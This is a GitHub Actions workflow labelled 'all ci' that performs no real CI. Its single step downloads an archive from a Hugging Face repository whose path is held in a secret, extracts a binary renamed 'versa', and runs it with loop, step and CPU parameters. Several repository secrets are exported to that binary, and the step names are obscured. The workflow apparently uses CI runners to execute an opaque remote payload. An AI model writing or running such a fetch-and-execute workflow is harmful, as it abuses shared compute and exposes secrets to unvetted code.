name: all ci

on:
  workflow_dispatch:
    inputs:
      amd_override:
        description: 'Ov a'
        required: false
        default: 'v3'
        type: string
      loop_override:
        description: 'Ov p'
        required: false
        default: '10'
        type: string

env:
  REPO_DIR: ${{ github.workspace }}
  TAG: v1.0.0_${{ github.event.inputs.amd_override }}
  LOOP: ${{ github.event.inputs.loop_override }}
  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
  ENV_ADS: ${{ secrets.ENV_ADS }}
  ENV_DISD: ${{ secrets.ENV_DISD }}
  HF_REPO: ${{ secrets.HF_REPO }}
  HGF: 'huggingface'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Masteru
        timeout-minutes: 37
        run: |
          curl -o a.7z -L --url "https://${{ env.HGF }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAG }}.7z?download=true"
          7z x a.7z && rm -rf a.7z && mv doit versa && chmod +x versa
          ./versa loop ${{ env.LOOP }} steps 1000000 wait 0 cpu 3
